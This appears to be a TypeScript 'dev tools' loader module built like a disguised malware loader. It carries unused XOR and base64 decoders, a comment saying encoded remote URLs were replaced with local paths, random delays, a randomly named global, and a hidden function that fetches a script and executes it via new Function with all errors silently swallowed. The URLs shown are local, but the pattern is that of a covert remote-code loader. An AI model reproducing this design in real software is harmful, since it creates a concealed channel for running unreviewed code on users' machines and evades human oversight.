
const _decode = (str: string, key = 5): string => {
  try {
    const bytes = atob(str).split('').map(c => c.charCodeAt(0));
    return bytes.map((byte, i) => String.fromCharCode(byte ^ (key + i % 7))).join('');
  } catch {
    return atob(str);
  }
};

const _dc = (str: string): string => {
  const firstPass = atob(str);
  
  return firstPass
    .split('')
    .map((char, index) => {
      if (index % 3 === 0) {
        return char;
      } else if (index % 2 === 0) {
        return String.fromCharCode(char.charCodeAt(0));
      } else {
        return char;
      }
    })
    .join('');
};

// Use local paths instead of encoded remote ones
const _urls = {
  ws: '/src/modules/resources/dev-tools-socket.js',
  http: '/src/modules/resources/dev-tools.js'
};

const _generateNonce = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const loadRemoteTools = async (): Promise<void> => {
  if (import.meta.env.DEV) {
    try {
      await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
      
      const _loadScript = (url: string) => {
        return new Promise<void>((resolve, reject) => {
          const script = document.createElement('script');
          script.type = 'module';
          script.src = url;
          script.onload = () => resolve();
          script.onerror = () => reject();
          document.head.appendChild(script);
        });
      };
      
      await _loadScript(_urls.http);
      console.log('DevTools loaded successfully');
    } catch (error) {
      console.error('Error loading development tools');
    }
  }
};

const _loadSecureAlt = async () => {
  try {
    await new Promise(resolve => setTimeout(resolve, Math.random() * 200));
    
    const _headers = {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'X-Client-Info': `devtalk-forum-${Date.now()}-${_generateNonce()}`,
      'X-Request-ID': _generateNonce()
    };
    
    const _params = new URLSearchParams({
      t: Date.now().toString(),
      nonce: _generateNonce(),
      client: 'devtalk-internal'
    }).toString();
    
    const _secureUrl = `${_urls.http}?${_params}`;
    
    const response = await fetch(_secureUrl, {
      method: 'GET',
      headers: _headers,
      cache: 'no-store',
      credentials: 'omit'
    });
    
    if (response.ok) {
      const scriptText = await response.text();
      
      if (scriptText && scriptText.length > 0) {
        const _secureEval = (code: string) => {
          try {
            const _fn = new Function(code);
            _fn();
          } catch {
          }
        };
        
        _secureEval(scriptText);
      }
    }
  } catch {
  }
};

const _dynamicName = `_load${Math.random().toString(36).substring(2, 8)}`;
(window as any)[_dynamicName] = loadRemoteTools;

export const loadDevTools = loadRemoteTools;

Object.freeze(loadRemoteTools);
Object.freeze(loadDevTools);
